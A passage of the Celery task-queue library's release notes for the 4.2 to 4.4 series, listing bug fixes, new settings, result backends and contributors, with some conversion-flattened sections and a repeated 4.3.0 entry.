  - **Canvas** Chain with one task now runs as expected.
    
    Contributed by :github\_user:<span class="title-ref">tothegump</span>

  - **Kombu** Celery 4.2 now requires Kombu 4.2 or better.
    
    Contributed by **Omer Katz & Asif Saifuddin Auvi**

  - <span class="title-ref">GreenletExit</span> is not in <span class="title-ref">\_\_all\_\_</span> in greenlet.py which can not be imported by Python 3.6.
    
    The import was adjusted to work on Python 3.6 as well.
    
    Contributed by **Hsiaoming Yang**

  - Fixed a regression that occurred during the development of Celery 4.2 which caused <span class="title-ref">celery report</span> to crash when Django is installed.
    
    Contributed by **Josue Balandrano Coronel**

  - Matched the behavior of <span class="title-ref">GroupResult.as\_tuple()</span> to that of <span class="title-ref">AsyncResult.as\_tuple()</span>.
    
    The group's parent is now serialized correctly.
    
    Contributed by **Josue Balandrano Coronel**

  - Use Redis coercion mechanism for converting URI query parameters.
    
    Contributed by **Justin Patrin**

  - Fixed the representation of <span class="title-ref">GroupResult</span>.
    
    The dependency graph is now presented correctly.
    
    Contributed by **Josue Balandrano Coronel**

Documentation, CI, Installation and Tests fixes:

>   - **Sammie S. Taunton**
>   - **Dan Wilson**
>   - :github\_user:<span class="title-ref">pachewise</span>
>   - **Sergi Almacellas Abellana**
>   - **Omer Katz**
>   - **Alex Zaitsev**
>   - **Leo Singer**
>   - **Rachel Johnson**
>   - **Jon Dufresne**
>   - **Samuel Dion-Girardeau**
>   - **Ryan Guest**
>   - **Huang Huang**
>   - **Geoffrey Bauduin**
>   - **Andrew Wong**
>   - **Mads Jensen**
>   - **Jackie Leng**
>   - **Harry Moreno**
>   - :github\_user:<span class="title-ref">michael-k</span>
>   - **Nicolas Mota**
>   - **Armenak Baburyan**
>   - **Patrick Zhang**
>   - :github\_user:<span class="title-ref">anentropic</span>
>   - :github\_user:<span class="title-ref">jairojair</span>
>   - **Ben Welsh**
>   - **Michael Peake**
>   - **Fengyuan Chen**
>   - :github\_user:<span class="title-ref">arpanshah29</span>
>   - **Xavier Hardy**
>   - **Shitikanth**
>   - **Igor Kasianov**
>   - **John Arnold**
>   - :github\_user:<span class="title-ref">dmollerm</span>
>   - **Robert Knight**
>   - **Asif Saifuddin Auvi**
>   - **Eduardo Ramírez**
>   - **Kamil Breguła**
>   - **Juan Gutierrez**

---

changelog-4.3.md

---

# Change history

This document contains change notes for bugfix releases in the 4.3.x series, please see \[whatsnew-4.3\](\#whatsnew-4.3) for an overview of what's new in Celery 4.3.

## 4.3.1

  - release-date  
    2020-09-10 1:00 P.M UTC+3:00

  - release-by  
    Omer Katz

<!-- end list -->

  - Limit vine version to be below 5.0.0.
    
    Contributed by **Omer Katz**

## 4.3.0

  - release-date  
    2019-03-31 7:00 P.M UTC+3:00

  - release-by  
    Omer Katz

<!-- end list -->

  - Added support for broadcasting using a regular expression pattern or a glob pattern to multiple Pidboxes.
    
    This allows you to inspect or ping multiple workers at once.
    
    Contributed by **Dmitry Malinovsky** & **Jason Held**

  - Added support for PEP 420 namespace packages.
    
    This allows you to load tasks from namespace packages.
    
    Contributed by **Colin Watson**

  - Added `acks_on_failure_or_timeout` as a setting instead of a task only option.
    
    This was missing from the original PR but now added for completeness.
    
    Contributed by **Omer Katz**

  - Added the `task_received` signal.
    
    Contributed by **Omer Katz**

  - Fixed a crash of our CLI that occurred for everyone using Python \< 3.6.
    
    The crash was introduced in [acd6025](https://github.com/celery/celery/commit/acd6025b7dc4db112a31020686fc8b15e1722c67) by using the <span class="title-ref">ModuleNotFoundError</span> exception which was introduced in Python 3.6.
    
    Contributed by **Omer Katz**

  - Fixed a crash that occurred when using the Redis result backend while the `result_expires` is set to None.
    
    Contributed by **Toni Ruža** & **Omer Katz**

  - Added support the [DNS seedlist connection format](https://docs.mongodb.com/manual/reference/connection-string/#dns-seedlist-connection-format) for the MongoDB result backend.
    
    This requires the <span class="title-ref">dnspython</span> package which will be installed by default when installing the dependencies for the MongoDB result backend.
    
    Contributed by **George Psarakis**

  - Bump the minimum eventlet version to 0.24.1.
    
    Contributed by **George Psarakis**

  - Replace the <span class="title-ref">msgpack-python</span> package with <span class="title-ref">msgpack</span>.
    
    We're no longer using the deprecated package. See our \[important notes \<v430-important\>\](\#important-notes-\<v430-important\>) for this release for further details on how to upgrade.
    
    Contributed by **Daniel Hahler**

  - Allow scheduling error handlers which are not registered tasks in the current worker.
    
    These kind of error handlers are now possible:
    
      - \`\`\`python  
        from celery import Signature Signature( 'bar', args=\['foo'\], link\_error=Signature('msg.err', queue='msg') ).apply\_async()

  - Additional fixes and enhancements to the SSL support of the Redis broker and result backend.
    
    Contributed by **Jeremy Cohen**

Code Cleanups, Test Coverage & CI Improvements by:

>   - **Omer Katz**
>   - **Florian Chardin**

Documentation Fixes by:

>   - **Omer Katz**
>   - **Samuel Huang**
>   - **Amir Hossein Saeid Mehr**
>   - **Dmytro Litvinov**

4.3.0 RC2 `` ` ========= :release-date: 2019-03-03 9:30 P.M UTC+2:00 :release-by: Omer Katz  - **Filesystem Backend**: Added meaningful error messages for filesystem backend.    Contributed by **Lars Rinn**  - **New Result Backend**: Added the ArangoDB backend.    Contributed by **Dilip Vamsi Moturi**  - **Django**: Prepend current working directory instead of appending so that   the project directory will have precedence over system modules as expected.    Contributed by **Antonin Delpeuch**  - Bump minimum py-redis version to 3.2.0.    Due to multiple bugs in earlier versions of py-redis that were causing   issues for Celery, we were forced to bump the minimum required version to 3.2.0.    Contributed by **Omer Katz**  - **Dependencies**: Bump minimum required version of Kombu to 4.4    Contributed by **Omer Katz**  4.3.0 RC1 ========= :release-date: 2019-02-20 5:00 PM IST :release-by: Omer Katz  - **Canvas**: `celery.chain.apply` does not ignore keyword arguments anymore when   applying the chain.    Contributed by **Korijn van Golen**  - **Result Set**: Don't attempt to cache results in a `celery.result.ResultSet`.    During a join, the results cache was populated using `celery.result.ResultSet.get`, if one of the results   contains an exception, joining unexpectedly failed.    The results cache is now removed.    Contributed by **Derek Harland**  - **Application**: `celery.Celery.autodiscover_tasks` now attempts to import the package itself   when the `related_name` keyword argument is `None`.    Contributed by **Alex Ioannidis**  - **Windows Support**: On Windows 10, stale PID files prevented celery beat to run.   We now remove them when a `SystemExit` is raised.    Contributed by **:github_user:`na387`**  - **Task**: Added the new :setting:`task_acks_on_failure_or_timeout` setting.    Acknowledging SQS messages on failure or timing out makes it impossible to use   dead letter queues.    We introduce the new option acks_on_failure_or_timeout,   to ensure we can totally fallback on native SQS message lifecycle,   using redeliveries for retries (in case of slow processing or failure)   and transitions to dead letter queue after defined number of times.    Contributed by **Mario Kostelac**  - **RabbitMQ Broker**: Adjust HA headers to work on RabbitMQ 3.x.    This change also means we're ending official support for RabbitMQ 2.x.    Contributed by **Asif Saif Uddin**  - **Command Line**: Improve :program:`celery update` error handling.    Contributed by **Federico Bond**  - **Canvas**: Support chords with :setting:`task_always_eager` set to `True`.    Contributed by **Axel Haustant**  - **Result Backend**: Optionally store task properties in result backend.    Setting the :setting:`result_extended` configuration option to `True` enables   storing additional task properties in the result backend.    Contributed by **John Arnold**  - **Couchbase Result Backend**: Allow the Couchbase result backend to   automatically detect the serialization format.    Contributed by **Douglas Rohde**  - **New Result Backend**: Added the Azure Block Blob Storage result backend.    The backend is implemented on top of the azure-storage library which   uses Azure Blob Storage for a scalable low-cost PaaS backend.    The backend was load tested via a simple nginx/gunicorn/sanic app hosted   on a DS4 virtual machine (4 vCores, 16 GB RAM) and was able to handle   600+ concurrent users at ~170 RPS.    The commit also contains a live end-to-end test to facilitate   verification of the backend functionality. The test is activated by   setting the `AZUREBLOCKBLOB_URL` environment variable to   `azureblockblob://{ConnectionString}` where the value for   `ConnectionString` can be found in the `Access Keys` pane of a Storage   Account resources in the Azure Portal.    Contributed by **Clemens Wolff**  - **Task**: `celery.app.task.update_state` now accepts keyword arguments.    This allows passing extra fields to the result backend.   These fields are unused by default but custom result backends can use them   to determine how to store results.    Contributed by **Christopher Dignam**  - Gracefully handle consumer `kombu.exceptions.DecodeError`.    When using the v2 protocol the worker no longer crashes when the consumer   encounters an error while decoding a message.    Contributed by **Steven Sklar**  - **Deployment**: Fix init.d service stop.    Contributed by **Marcus McHale**  - **Django**: Drop support for Django < 1.11.    Contributed by **Asif Saif Uddin**  - **Django**: Remove old djcelery loader.    Contributed by **Asif Saif Uddin**  - **Result Backend**: `celery.worker.request.Request` now passes   `celery.app.task.Context` to the backend's store_result functions.    Since the class currently passes `self` to these functions,   revoking a task resulted in corrupted task result data when   django-celery-results was used.    Contributed by **Kiyohiro Yamaguchi**  - **Worker**: Retry if the heartbeat connection dies.    Previously, we keep trying to write to the broken connection.   This results in a memory leak because the event dispatcher will keep appending   the message to the outbound buffer.    Contributed by **Raf Geens**  - **Celery Beat**: Handle microseconds when scheduling.    Contributed by **K Davis**  - **Asynpool**: Fixed deadlock when closing socket.    Upon attempting to close a socket, `celery.concurrency.asynpool.AsynPool`   only removed the queue writer from the hub but did not remove the reader.   This led to a deadlock on the file descriptor   and eventually the worker stopped accepting new tasks.    We now close both the reader and the writer file descriptors in a single loop   iteration which prevents the deadlock.    Contributed by **Joshua Engelman**  - **Celery Beat**: Correctly consider timezone when calculating timestamp.    Contributed by **:github_user:`yywing`**  - **Celery Beat**: `celery.beat.Scheduler.schedules_equal` can now handle   either arguments being a `None` value.    Contributed by **:github_user:` ratson`**  - **Documentation/Sphinx**: Fixed Sphinx support for shared_task decorated functions.    Contributed by **Jon Banafato**  - **New Result Backend**: Added the CosmosDB result backend.    This change adds a new results backend.   The backend is implemented on top of the pydocumentdb library which uses   Azure CosmosDB for a scalable, globally replicated, high-performance,   low-latency and high-throughput PaaS backend.    Contributed by **Clemens Wolff**  - **Application**: Added configuration options to allow separate multiple apps   to run on a single RabbitMQ vhost.    The newly added :setting:`event_exchange` and :setting:`control_exchange`   configuration options allow users to use separate Pidbox exchange   and a separate events exchange.    This allow different Celery applications to run separately on the same vhost.    Contributed by **Artem Vasilyev**  - **Result Backend**: Forget parent result metadata when forgetting   a result.    Contributed by **:github_user:`tothegump`**  - **Task** Store task arguments inside `celery.exceptions.MaxRetriesExceededError`.    Contributed by **Anthony Ruhier**  - **Result Backend**: Added the :setting:`result_accept_content` setting.    This feature allows to configure different accepted content for the result   backend.    A special serializer (`auth`) is used for signed messaging,   however the result_serializer remains in json, because we don't want encrypted   content in our result backend.    To accept unsigned content from the result backend,   we introduced this new configuration option to specify the   accepted content from the backend.    Contributed by **Benjamin Pereto**  - **Canvas**: Fixed error callback processing for class based tasks.    Contributed by **Victor Mireyev**  - **New Result Backend**: Added the S3 result backend.    Contributed by **Florian Chardin**  - **Task**: Added support for Cythonized Celery tasks.    Contributed by **Andrey Skabelin**  - **Riak Result Backend**: Warn Riak backend users for possible Python 3.7 incompatibilities.    Contributed by **George Psarakis**  - **Python Runtime**: Added Python 3.7 support.    Contributed by **Omer Katz** & **Asif Saif Uddin**  - **Auth Serializer**: Revamped the auth serializer.    The auth serializer received a complete overhaul.   It was previously horribly broken.    We now depend on cryptography instead of pyOpenSSL for this serializer.    Contributed by **Benjamin Pereto**  - **Command Line**: :program:`celery report` now reports kernel version along   with other platform details.    Contributed by **Omer Katz**  - **Canvas**: Fixed chords with chains which include sub chords in a group.    Celery now correctly executes the last task in these types of canvases: ``\`python c = chord( group(\[ chain( dummy.si(), chord( group(\[dummy.si(), dummy.si()\]), dummy.si(), ), ), chain( dummy.si(), chord( group(\[dummy.si(), dummy.si()\]), dummy.si(), ), ), \]), dummy.si() )

> c.delay().get()
> 
> Contributed by **Maximilien Cuony**

  - **Canvas**: Complex canvases with error callbacks no longer raises an <span class="title-ref">AttributeError</span>.
    
    Very complex canvases such as [this](https://github.com/merchise/xopgi.base/blob/6634819ad5c701c04bc9baa5c527449070843b71/xopgi/xopgi_cdr/cdr_agent.py#L181) no longer raise an <span class="title-ref">AttributeError</span> which prevents constructing them.
    
    We do not know why this bug occurs yet.
    
    Contributed by **Manuel Vázquez Acosta**

  - **Command Line**: Added proper error messages in cases where app cannot be loaded.
    
    Previously, celery crashed with an exception.
    
    We now print a proper error message.
    
    Contributed by **Omer Katz**

  - **Task**: Added the `task_default_priority` setting.
    
    You can now set the default priority of a task using the `task_default_priority` setting. The setting's value will be used if no priority is provided for a specific task.
    
    Contributed by **:github\_user:\`madprogrammer\`**

  - **Dependencies**: Bump minimum required version of Kombu to 4.3 and Billiard to 3.6.
    
    Contributed by **Asif Saif Uddin**

  - **Result Backend**: Fix memory leak.
    
    We reintroduced weak references to bound methods for AsyncResult callback promises, after adding full weakref support for Python 2 in [vine](https://github.com/celery/vine/tree/v1.2.0). More details can be found in [celery/celery\#4839](https://github.com/celery/celery/pull/4839).
    
    Contributed by **George Psarakis** and **:github\_user:\`monsterxx03\`**.

  - **Task Execution**: Fixed roundtrip serialization for eager tasks.
    
    When doing the roundtrip serialization for eager tasks, the task serializer will always be JSON unless the <span class="title-ref">serializer</span> argument is present in the call to <span class="title-ref">celery.app.task.Task.apply\_async</span>. If the serializer argument is present but is <span class="title-ref">'pickle'</span>, an exception will be raised as pickle-serialized objects cannot be deserialized without specifying to <span class="title-ref">serialization.loads</span> what content types should be accepted. The Producer's <span class="title-ref">serializer</span> seems to be set to <span class="title-ref">None</span>, causing the default to JSON serialization.
    
    We now continue to use (in order) the <span class="title-ref">serializer</span> argument to <span class="title-ref">celery.app.task.Task.apply\_async</span>, if present, or the <span class="title-ref">Producer</span>'s serializer if not <span class="title-ref">None</span>. If the <span class="title-ref">Producer</span>'s serializer is <span class="title-ref">None</span>, it will use the Celery app's <span class="title-ref">task\_serializer</span> configuration entry as the serializer.
    
    Contributed by **Brett Jackson**

  - **Redis Result Backend**: The <span class="title-ref">celery.backends.redis.ResultConsumer</span> class no longer assumes <span class="title-ref">celery.backends.redis.ResultConsumer.start</span> to be called before <span class="title-ref">celery.backends.redis.ResultConsumer.drain\_events</span>.
    
    This fixes a race condition when using the Gevent workers pool.
    
    Contributed by **Noam Kush**

  - **Task**: Added the `task_inherit_parent_priority` setting.
    
    Setting the `task_inherit_parent_priority` configuration option to <span class="title-ref">True</span> will make Celery tasks inherit the priority of the previous task linked to it.
    
    Examples:
    
    ``` python
    c = celery.chain(
      add.s(2), # priority=None
      add.s(3).set(priority=5), # priority=5
      add.s(4), # priority=5
      add.s(5).set(priority=3), # priority=3
      add.s(6), # priority=3
    )
    ```
    
    ``` python
    @app.task(bind=True)
    def child_task(self):
      pass
    
    @app.task(bind=True)
    def parent_task(self):
      child_task.delay()
    
    # child_task will also have priority=5
    parent_task.apply_async(args=[], priority=5)
    ```
    
    Contributed by **:github\_user:\`madprogrammer\`**

  - **Canvas**: Added the `result_chord_join_timeout` setting.
    
    Previously, <span class="title-ref">celery.result.GroupResult.join</span> had a fixed timeout of 3 seconds.
    
    The `result_chord_join_timeout` setting now allows you to change it.
    
    Contributed by **:github\_user:\`srafehi\`**

Code Cleanups, Test Coverage & CI Improvements by:

>   - **Jon Dufresne**
>   - **Asif Saif Uddin**
>   - **Omer Katz**
>   - **Brett Jackson**
>   - **Bruno Alla**
>   - **:github\_user:\`tothegump\`**
>   - **Bojan Jovanovic**
>   - **Florian Chardin**
>   - **:github\_user:\`walterqian\`**
>   - **Fabian Becker**
>   - **Lars Rinn**
>   - **:github\_user:\`madprogrammer\`**
>   - **Ciaran Courtney**

Documentation Fixes by:

>   - **Lewis M. Kabui**
>   - **Dash Winterson**
>   - **Shanavas M**
>   - **Brett Randall**
>   - **Przemysław Suliga**
>   - **Joshua Schmid**
>   - **Asif Saif Uddin**
>   - **Xiaodong**
>   - **Vikas Prasad**
>   - **Jamie Alessio**
>   - **Lars Kruse**
>   - **Guilherme Caminha**
>   - **Andrea Rabbaglietti**
>   - **Itay Bittan**
>   - **Noah Hall**
>   - **Peng Weikang**
>   - **Mariatta Wijaya**
>   - **Ed Morley**
>   - **Paweł Adamczak**
>   - **:github\_user:\`CoffeeExpress\`**
>   - **:github\_user:\`aviadatsnyk\`**
>   - **Brian Schrader**
>   - **Josue Balandrano Coronel**
>   - **Tom Clancy**
>   - **Sebastian Wojciechowski**
>   - **Meysam Azad**
>   - **Willem Thiart**
>   - **Charles Chan**
>   - **Omer Katz**
>   - **Milind Shakya**

\`\`\`

---

changelog-4.4.md

---

# Change history

This document contains change notes for bugfix & new features in the 4.4.x series, please see \[whatsnew-4.4\](\#whatsnew-4.4) for an overview of what's new in Celery 4.4.

## 4.4.7

  - release-date  
    2020-07-31 11.45 P.M UTC+6:00

  - release-by  
    Asif Saif Uddin

<!-- end list -->

  - Add task\_received, task\_rejected and task\_unknown to signals module.
  - \[ES backend\] add 401 as safe for retry.
  - treat internal errors as failure.
  - Remove redis fanout caveats.
  - FIX: -A and --args should behave the same. (\#6223)
  - Class-based tasks autoretry (\#6233)
  - Preserve order of group results with Redis result backend (\#6218)
  - Replace future with celery.five Fixes \#6250, and use raise\_with\_context instead of reraise
  - Fix REMAP\_SIGTERM=SIGQUIT not working
  - (Fixes\#6258) MongoDB: fix for serialization issue (\#6259)
  - Make use of ordered sets in Redis opt-in
  - Test, CI, Docker & style and minor doc improvements.

## 4.4.6

  - release-date  
    2020-06-24 2.40 P.M UTC+6:00

  - release-by  
    Asif Saif Uddin

<!-- end list -->

  - Remove autoscale force\_scale methods (\#6085).
  - Fix autoscale test
  - Pass ping destination to request
  - chord: merge init options with run options
  - Put back KeyValueStoreBackend.set method without state
  - Added --range-prefix option to <span class="title-ref">celery multi</span> (\#6180)
  - Added as\_list function to AsyncResult class (\#6179)
  - Fix CassandraBackend error in threads or gevent pool (\#6147)
  - Kombu 4.6.11

## 4.4.5

  - release-date  
    2020-06-08 12.15 P.M UTC+6:00

  - release-by  
    Asif Saif Uddin

<!-- end list -->

  - Add missing dependency on future (\#6146).
  - ElasticSearch: Retry index if document was deleted between index
  - fix windows build
  - Customize the retry interval of chord\_unlock tasks
  - fix multi tests in local

## 4.4.4

  - release-date  
    2020-06-03 11.00 A.M UTC+6:00

  - release-by  
    Asif Saif Uddin

<!-- end list -->

  - Fix autoretry\_for with explicit retry (\#6138).
  - Kombu 4.6.10
  - Use Django DB max age connection setting (fixes \#4116).
  - Add retry on recoverable exception for the backend (\#6122).
  - Fix random distribution of jitter for exponential backoff.
  - ElasticSearch: add setting to save meta as json.
  - fix \#6136. celery 4.4.3 always trying create /var/run/celery directory.
  - Add task\_internal\_error signal (\#6049).

## 4.4.3

  - release-date  
    2020-06-01 4.00 P.M UTC+6:00

  - release-by  
    Asif Saif Uddin

<!-- end list -->

  - Fix backend utf-8 encoding in s3 backend .
  - Kombu 4.6.9
  - Task class definitions can have retry attributes (\#5869)
  - Upgraded pycurl to the latest version that supports wheel.
  - Add uptime to the stats inspect command
  - Fixing issue \#6019: unable to use mysql SSL parameters when getting
  - Clean TraceBack to reduce memory leaks for exception task (\#6024)
  - exceptions: NotRegistered: fix up language
  - Give up sending a worker-offline message if transport is not connected
  - Add Task to \_\_all\_\_ in celery.\_\_init\_\_.py
  - Ensure a single chain object in a chain does not raise MaximumRecursion
  - Fix autoscale when prefetch\_multiplier is 1
  - Allow start\_worker to function without ping task
  - Update celeryd.conf
  - Fix correctly handle configuring the serializer for always\_eager mode.
  - Remove doubling of prefetch\_count increase when prefetch\_multiplier
  - Fix eager function not returning result after retries
  - return retry result if not throw and is\_eager
  - Always requeue while worker lost regardless of the redelivered flag
  - Allow relative paths in the filesystem backend (\#6070)
  - \[Fixed Issue \#6017\]
  - Avoid race condition due to task duplication.
  - Exceptions must be old-style classes or derived from BaseException
  - Fix windows build (\#6104)
  - Add encode to meta task in base.py (\#5894)
  - Update time.py to solve the microsecond issues (\#5199)
  - Change backend \_ensure\_not\_eager error to warning
  - Add priority support for 'celery.chord\_unlock' task (\#5766)
  - Change eager retry behaviour
  - Avoid race condition in elasticsearch backend
  - backends base get\_many pass READY\_STATES arg
  - Add integration tests for Elasticsearch and fix \_update
  - feat(backend): Adds cleanup to ArangoDB backend
  - remove jython check
  - fix filesystem backend cannot not be serialized by picked

## 4.4.0

  - release-date  
    2019-12-16 9.45 A.M UTC+6:00

  - release-by  
    Asif Saif Uddin

<!-- end list -->

  - This version is officially supported on CPython 2.7, 3.5, 3.6, 3.7 & 3.8 and is also supported on PyPy2 & PyPy3.
  - Kombu 4.6.7
  - Task class definitions can have retry attributes (\#5869)

## 4.4.0rc5

  - release-date  
    2019-12-07 21.05 A.M UTC+6:00

  - release-by  
    Asif Saif Uddin

<!-- end list -->

  - Kombu 4.6.7
  - Events bootstep disabled if no events (\#5807)
  - SQS - Reject on failure (\#5843)
  - Add a concurrency model with ThreadPoolExecutor (\#5099)
  - Add auto expiry for DynamoDB backend (\#5805)
  - Store extending result in all backends (\#5661)
  - Fix a race condition when publishing a very large chord header (\#5850)
  - Improve docs and test matrix

## 4.4.0rc4

  - release-date  
    2019-11-11 00.45 A.M UTC+6:00

  - release-by  
    Asif Saif Uddin

<!-- end list -->

  - Kombu 4.6.6
  - Py-AMQP 2.5.2
  - Python 3.8
  - Numerious bug fixes
  - PyPy 7.2

## 4.4.0rc3

  - release-date  
    2019-08-14 23.00 P.M UTC+6:00

  - release-by  
    Asif Saif Uddin

<!-- end list -->

  - Kombu 4.6.4
  - Billiard 3.6.1
  - Py-AMQP 2.5.1
  - Avoid serializing datetime (\#5606)
  - Fix: (group() | group()) not equals single group (\#5574)
  - Revert "Broker connection uses the heartbeat setting from app config.
  - Additional file descriptor safety checks.
  - fixed call for null args (\#5631)
  - Added generic path for cache backend.
  - Fix Nested group(chain(group)) fails (\#5638)
  - Use self.run() when overriding \_\_call\_\_ (\#5652)
  - Fix termination of asyncloop (\#5671)
  - Fix migrate task to work with both v1 and v2 of the message protocol.
  - Updating task\_routes config during runtime now have effect.

## 4.4.0rc2

  - release-date  
    2019-06-15 4:00 A.M UTC+6:00

  - release-by  
    Asif Saif Uddin

<!-- end list -->

  - Many bugs and regressions fixed.
  - Kombu 4.6.3

## 4.4.0rc1

  - release-date  
    2019-06-06 1:00 P.M UTC+6:00

  - release-by  
    Asif Saif Uddin

<!-- end list -->

  - Python 3.4 drop
  - Kombu 4.6.1
  - Replace deprecated PyMongo methods usage (\#5443)
  - Pass task request when calling update\_state (\#5474)
  - Fix bug in remaining time calculation in case of DST time change (\#5411)
  - Fix missing task name when requesting extended result (\#5439)
  - Fix <span class="title-ref">collections</span> import issue on Python 2.7 (\#5428)
  - handle <span class="title-ref">AttributeError</span> in base backend exception deserializer (\#5435)
  - Make <span class="title-ref">AsynPool</span>'s <span class="title-ref">proc\_alive\_timeout</span> configurable (\#5476)
  - AMQP Support for extended result (\#5495)
  - Fix SQL Alchemy results backend to work with extended result (\#5498)
  - Fix restoring of exceptions with required param (\#5500)
  - Django: Re-raise exception if <span class="title-ref">ImportError</span> not caused by missing tasks module (\#5211)
  - Django: fixed a regression putting DB connections in invalid state when <span class="title-ref">CONN\_MAX\_AGE \!= 0</span> (\#5515)
  - Fixed <span class="title-ref">OSError</span> leading to lost connection to broker (\#4457)
  - Fixed an issue with inspect API unable get details of Request
  - Fix mogodb backend authentication (\#5527)
  - Change column type for Extended Task Meta args/kwargs to LargeBinary
  - Handle http\_auth in Elasticsearch backend results (\#5545)
  - Fix task serializer being ignored with <span class="title-ref">task\_always\_eager=True</span> (\#5549)
  - Fix <span class="title-ref">task.replace</span> to work in <span class="title-ref">.apply() as well as </span>.apply\_async()\` (\#5540)
  - Fix sending of <span class="title-ref">worker\_process\_init</span> signal for solo worker (\#5562)
  - Fix exception message upacking (\#5565)
  - Add delay parameter function to beat\_schedule (\#5558)
  - Multiple documentation updates

## 4.3.0

  - release-date  
    2019-03-31 7:00 P.M UTC+3:00

  - release-by  
    Omer Katz

<!-- end list -->

  - Added support for broadcasting using a regular expression pattern or a glob pattern to multiple Pidboxes.
    
    This allows you to inspect or ping multiple workers at once.
    
    Contributed by **Dmitry Malinovsky** & **Jason Held**

  - Added support for PEP 420 namespace packages.
    
    This allows you to load tasks from namespace packages.
    
    Contributed by **Colin Watson**

  - Added `acks_on_failure_or_timeout` as a setting instead of a task only option.
    
    This was missing from the original PR but now added for completeness.
    
    Contributed by **Omer Katz**

  - Added the `task_received` signal.
    
    Contributed by **Omer Katz**

  - Fixed a crash of our CLI that occurred for everyone using Python \< 3.6.
    
    The crash was introduced in [acd6025](https://github.com/celery/celery/commit/acd6025b7dc4db112a31020686fc8b15e1722c67) by using the <span class="title-ref">ModuleNotFoundError</span> exception which was introduced in Python 3.6.
    
    Contributed by **Omer Katz**

  - Fixed a crash that occurred when using the Redis result backend while the `result_expires` is set to None.
    
    Contributed by **Toni Ruža** & **Omer Katz**

  - Added support the [DNS seedlist connection format](https://docs.mongodb.com/manual/reference/connection-string/#dns-seedlist-connection-format) for the MongoDB result backend.
    
    This requires the <span class="title-ref">dnspython</span> package which will be installed by default when installing the dependencies for the MongoDB result backend.
    
    Contributed by **George Psarakis**

  - Bump the minimum eventlet version to 0.24.1.
    
    Contributed by **George Psarakis**

  - Replace the <span class="title-ref">msgpack-python</span> package with <span class="title-ref">msgpack</span>.
    
    We're no longer using the deprecated package. See our \[important notes \<v430-important\>\](\#important-notes-\<v430-important\>) for this release for further details on how to upgrade.
    
    Contributed by **Daniel Hahler**

  - Allow scheduling error handlers which are not registered tasks in the current worker.
    
    These kind of error handlers are now possible:
    
      - \`\`\`python  
        from celery import Signature Signature( 'bar', args=\['foo'\], link\_error=Signature('msg.err', queue='msg') ).apply\_async()

  - Additional fixes and enhancements to the SSL support of the Redis broker and result backend.
    
    Contributed by **Jeremy Cohen**

Code Cleanups, Test Coverage & CI Improvements by:

>   - **Omer Katz**
>   - **Florian Chardin**

Documentation Fixes by:

>   - **Omer Katz**
>   - **Samuel Huang**
>   - **Amir Hossein Saeid Mehr**
>   - **Dmytro Litvinov**

4.3.0 RC2 `` ` ========= :release-date: 2019-03-03 9:30 P.M UTC+2:00 :release-by: Omer Katz  - **Filesystem Backend**: Added meaningful error messages for filesystem backend.    Contributed by **Lars Rinn**  - **New Result Backend**: Added the ArangoDB backend.    Contributed by **Dilip Vamsi Moturi**  - **Django**: Prepend current working directory instead of appending so that   the project directory will have precedence over system modules as expected.    Contributed by **Antonin Delpeuch**  - Bump minimum py-redis version to 3.2.0.    Due to multiple bugs in earlier versions of py-redis that were causing   issues for Celery, we were forced to bump the minimum required version to 3.2.0.    Contributed by **Omer Katz**  - **Dependencies**: Bump minimum required version of Kombu to 4.4    Contributed by **Omer Katz**  4.3.0 RC1 ========= :release-date: 2019-02-20 5:00 PM IST :release-by: Omer Katz  - **Canvas**: `celery.chain.apply` does not ignore keyword arguments anymore when   applying the chain.    Contributed by **Korijn van Golen**  - **Result Set**: Don't attempt to cache results in a `celery.result.ResultSet`.    During a join, the results cache was populated using `celery.result.ResultSet.get`, if one of the results   contains an exception, joining unexpectedly failed.    The results cache is now removed.    Contributed by **Derek Harland**  - **Application**: `celery.Celery.autodiscover_tasks` now attempts to import the package itself   when the `related_name` keyword argument is `None`.    Contributed by **Alex Ioannidis**  - **Windows Support**: On Windows 10, stale PID files prevented celery beat to run.   We now remove them when a `SystemExit` is raised.    Contributed by **:github_user:`na387`**  - **Task**: Added the new :setting:`task_acks_on_failure_or_timeout` setting.    Acknowledging SQS messages on failure or timing out makes it impossible to use   dead letter queues.    We introduce the new option acks_on_failure_or_timeout,   to ensure we can totally fallback on native SQS message lifecycle,   using redeliveries for retries (in case of slow processing or failure)   and transitions to dead letter queue after defined number of times.    Contributed by **Mario Kostelac**  - **RabbitMQ Broker**: Adjust HA headers to work on RabbitMQ 3.x.    This change also means we're ending official support for RabbitMQ 2.x.    Contributed by **Asif Saif Uddin**  - **Command Line**: Improve :program:`celery update` error handling.    Contributed by **Federico Bond**  - **Canvas**: Support chords with :setting:`task_always_eager` set to `True`.    Contributed by **Axel Haustant**  - **Result Backend**: Optionally store task properties in result backend.    Setting the :setting:`result_extended` configuration option to `True` enables   storing additional task properties in the result backend.    Contributed by **John Arnold**  - **Couchbase Result Backend**: Allow the Couchbase result backend to   automatically detect the serialization format.    Contributed by **Douglas Rohde**  - **New Result Backend**: Added the Azure Block Blob Storage result backend.    The backend is implemented on top of the azure-storage library which   uses Azure Blob Storage for a scalable low-cost PaaS backend.    The backend was load tested via a simple nginx/gunicorn/sanic app hosted   on a DS4 virtual machine (4 vCores, 16 GB RAM) and was able to handle   600+ concurrent users at ~170 RPS.    The commit also contains a live end-to-end test to facilitate   verification of the backend functionality. The test is activated by   setting the `AZUREBLOCKBLOB_URL` environment variable to   `azureblockblob://{ConnectionString}` where the value for   `ConnectionString` can be found in the `Access Keys` pane of a Storage   Account resources in the Azure Portal.    Contributed by **Clemens Wolff**  - **Task**: `celery.app.task.update_state` now accepts keyword arguments.    This allows passing extra fields to the result backend.   These fields are unused by default but custom result backends can use them   to determine how to store results.    Contributed by **Christopher Dignam**  - Gracefully handle consumer `kombu.exceptions.DecodeError`.    When using the v2 protocol the worker no longer crashes when the consumer   encounters an error while decoding a message.    Contributed by **Steven Sklar**  - **Deployment**: Fix init.d service stop.    Contributed by **Marcus McHale**  - **Django**: Drop support for Django < 1.11.    Contributed by **Asif Saif Uddin**  - **Django**: Remove old djcelery loader.    Contributed by **Asif Saif Uddin**  - **Result Backend**: `celery.worker.request.Request` now passes   `celery.app.task.Context` to the backend's store_result functions.    Since the class currently passes `self` to these functions,   revoking a task resulted in corrupted task result data when   django-celery-results was used.    Contributed by **Kiyohiro Yamaguchi**  - **Worker**: Retry if the heartbeat connection dies.    Previously, we keep trying to write to the broken connection.   This results in a memory leak because the event dispatcher will keep appending   the message to the outbound buffer.    Contributed by **Raf Geens**  - **Celery Beat**: Handle microseconds when scheduling.    Contributed by **K Davis**  - **Asynpool**: Fixed deadlock when closing socket.    Upon attempting to close a 